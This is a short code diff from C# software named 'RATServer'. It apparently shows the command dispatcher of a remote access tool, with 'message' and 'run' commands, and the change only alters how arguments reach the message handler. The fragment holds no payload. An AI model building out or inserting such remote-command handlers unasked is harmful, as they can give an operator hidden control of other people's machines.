@@ -53,7 +53,7 @@ namespace RATServer
                     switch (c.CMD)
                     {
                         case "message":
-                            r = Functions.Message(c.Args[0]);
+                            r = Functions.Message(c.Args);
                             break;
                         case "run":
                             r = Functions.Run(c.Args[0]);
